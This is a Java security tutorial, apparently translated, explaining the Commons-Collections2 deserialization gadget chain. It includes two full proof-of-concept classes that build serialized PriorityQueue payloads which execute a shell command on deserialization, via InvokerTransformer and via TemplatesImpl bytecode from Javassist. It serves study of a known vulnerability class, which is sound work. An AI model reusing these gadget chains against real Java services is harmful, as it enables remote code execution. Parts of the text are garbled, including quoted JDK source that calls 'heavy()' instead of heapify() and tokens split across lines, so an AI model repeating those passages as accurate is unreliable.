# Java Security Learning-Commons-Collections2 Chain

Author: H3rmesk1t

#Environmental construction
> 1. `JDK` version: JDK1.8u66
> 2. `Commons-Collections4` version: 4.0
> 3. `javassit` version: `3.25.0-GA`

> Use `maven` to build it. First create a `Maven` project without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.25.0-GA</version>
        </dependency>
    </dependencies>

</project>
```

# Pre-knowledge
## PriorityQueue
> `PriorityQueue` priority queue is a special queue based on the priority heap. It defines "priority" for each element. In this way, when data is retrieved, it will be taken according to priority. By default, the priority queue will sort elements according to natural order. Therefore, elements placed in the `PriorityQueue` must implement the `Comparable` interface. `PriorityQueue` will determine the priority of dequeue based on the order of the elements. If the `Comparable` interface is not implemented, `PriorityQueue` also allows providing a `Comparator` object to determine the order of two elements. `PriorityQueue` supports deserialization. After deserializing the data into `queue` in the rewritten `readObject` method, the `heapify()` method will be called to sort the data.

<img src="./images/1.png" alt="">

> In the `heapify()` method, the `siftDown()` method will be called, the `siftDownUsingComparator()` method will be called, and the `siftDownUsingComparator` method will be called in the `siftDownUsingComparator()` method will be called to compare and sort priority

<img src="./images/2.png" alt="">

## TransformingComparator
> `TransformingComparator` is similar to `TransformedMap`, and uses `Tranformer` to decorate a `Comparator`. The value to be compared will be converted using `Tranformer` first, and then passed to `Comparator`. When `TransformingComparator` is initialized, `Transformer` and `Comparator` are configured. If `Comparator` is not specified, `ComparableComparator.<Comparable>comparableComparator()`
> When calling the `compare` method of `TransformingComparator`, the `this.transformer.transform()` method is called to convert the two values ​​to be compared, and then the `compare` method is called to compare

<img src="./images/3.png" alt="">

> In the `PriorrityQueue`, the priority comparison and sorting will be performed through the `comparator``` compare()` method. Here you can connect it with the previous one by calling the `transformingComparator` method.

## Javassist
> `Java` bytecode is stored in the `.class` file in binary form. Each `.class` file contains a `Java` class or interface. `Javaassist` is a class library used to process `Java` bytecode. It can add new methods to a compiled class, or modify existing methods, and does not require in-depth understanding of bytecode. At the same time, it can also generate a new class object, which can be completely manual.

## TemplatesImpl
> The property of `TemplatesImpl`_bytecodes` stores the class bytecode. Some methods of the `TemplatesImpl` class can use this class bytecode to instantiate this class. The parent class of this class must be `AbstractTranslet`. Malicious code is written in the parameterless constructor or static code block of this class, and then instantiate this class with the hand of `TemplatesImpl` to trigger malicious code

# Commons-Collections2 Analysis
> Follow up on `PriorityQueue#readObject` first. The value of `queue` comes from `readObject()` method, which is controllable. After the loop is completed, the `heapify()` method will be called.

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heavy();
}
```
> In the `heapify()` method, the `siftDown()` method will continue to be called. The `x` here is controllable. Let the `comparator` call the `siftDownUsingComparator()` method not empty, and then the `siftDownUsingComparator()` method will be called. The `compare` method of the previous `comparator` is called.

```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}

private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}

private void siftDownUsingComparator(int k, Ex) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E
) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```
> Here we combine `comparator` and `TransformingComparator`. If `this.transformer` is controllable here, you can further utilize the second half of the `CC-1` chain.

```java
public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```
> There are several things to note here. If the `heapify()` method is greater than `1`, only in this way will you continue to enter the `siftDown()` method, and the value of `size` comes from

## POC-1
> Use the latter part of `PriorityQueue` and `CommonsCollections-1` to construct

```java
package CommonsCollections2;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/26 9:42 pm
 */
public class CommonsCollectionsGadget1 {
    // public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
    public static void CC2() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        try {
            // Serialization operation
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget.bin"));
            outputStream.writeObject(priorityQueue);
            outputStream.close();
            // Deserialization operation
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC2();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/4.png" alt="">

## POC-2
> In order to better meet the requirements in practical use, use InvokerTransformer to trigger the `TemplatesImpl`' newTransformer` to read malicious bytecode to execute commands, and use `javassist` and `TemplatesImpl` to construct

```java
package CommonsCollections2;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.*;
import java.io.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.
lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 1:37 am
 */
public class CommonsCollectionsGadget2 {
    public static void CC2() throws NoSuchMethodException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NotFoundException, CannotCompileException, IOException{
        Class c1 = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer");
        Constructor constructor = c1.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("CommonsCollectionsEvilCode");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);
        ctClass.writeFile("./");

        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        TemplatesImpl templates = new TemplatesImpl();
        Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetByteCodes);
        _tfactory.set(templates, new TransformerFactoryImpl());

        TransformingComparator transformingComparator = new TransformingComparator(transformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class c2 = Class.forName("java.util.PriorityQueue");
        Field _queue = c2.getDeclaredField("queue");
        _queue.setAccessible(true);
        Object[] queue_array = new Object[]{templates,1};
        _queue.set(priorityQueue,queue_array);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        try {
            // Serialization operation
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget2.bin"));
            outputStream.writeObject(priorityQueue);
            outputStream.close();
            // Deserialization operation
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget2.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC2();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/5.png" alt="">

# Call chain
```java
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                PriorityQueue.siftDownUsingComparator()
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                                Method.invoke()
                                    TemplatesImpl.newTransformer()
                                         TemplatesImpl.getTransletInstance()
                                         TemplatesImpl.defineTransletClasses
                                         newInstance()
                                            Runtime.exec()
```

# Summarize
> Use `PriorityQueue` to optimize the queue after deserialization
The characteristics of prior ordering are to specify the `TransformingComparator` sorting method and add `Transforer` to it. Similar to the `CommonsCollections1` chain, the main trigger position is still `InvokerTransformer`